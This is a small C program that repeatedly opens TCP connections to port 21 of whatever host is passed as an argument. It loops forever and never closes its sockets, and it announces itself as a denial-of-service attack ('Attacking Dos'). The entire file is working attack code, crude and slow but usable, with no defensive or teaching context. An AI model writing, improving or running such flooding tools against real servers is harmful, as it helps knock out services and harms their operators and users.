#include <stdio.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>
#include <netdb.h>

int main(int argc, char *argv[]) {
    int mysocket;
    int connectt;
    int port = 21;
    char *destiny;
    destiny = argv[1];

    struct sockaddr_in target;
    struct hostent *target_info = gethostbyname(argv[1]);

    if (target_info == NULL ) {
	perror("Error to resolve domain");
	return 1;
    }

    while (1) {
        mysocket = socket(AF_INET, SOCK_STREAM, 0);

	if (mysocket == -1) {
		perror("Error");
		continue;
	}

        target.sin_family = AF_INET;
        target.sin_port = htons(port);
	target.sin_addr = *((struct in_addr *)target_info->h_addr);

        connectt = connect(mysocket, (struct sockaddr *)&target, sizeof(target));
        if (connectt == 0) {
            printf("Attacking Dos %s, %d\n", destiny, port);
        } else {
		perror("Error");
	}

	sleep(1);

    }

    return 0;
}
